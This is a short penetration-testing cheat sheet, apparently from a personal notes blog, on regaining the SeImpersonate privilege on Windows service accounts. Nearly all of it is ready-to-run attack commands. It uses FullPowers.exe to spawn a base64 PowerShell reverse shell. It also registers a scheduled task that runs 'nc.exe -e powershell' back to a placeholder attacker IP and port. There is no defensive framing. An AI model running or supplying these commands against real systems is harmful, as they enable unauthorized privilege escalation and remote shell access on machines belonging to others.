---
title: "SeImpresonate"
date: 2025-7-25
tags: ["SeImpresonate", "Windows", "Potato", "Privilege Escalation", "Fullpower", "Scheduled Tasks"]
---

### Abuse #1: Recover SeImpresonate

```console
.\FullPowers.exe -c "whoami /priv"
```

```console
# Revshell
.\FullPowers.exe -c "<POWERSHELL_3_BASE64>"
```

<small>*Ref: [FullPower](https://github.com/itm4n/FullPowers/releases/tag/v0.1)*</small>

### Abuse #2: Recover Tokens via Schedule Tasks

```console
# Create a list of privileges 
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
```

```console
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs
```

```console
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell <LOCAL_IP> <LOCAL_PORT>`""
```

```console
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal
```

```console
# Start the task
Start-ScheduledTask -TaskName "SomeTask"
```
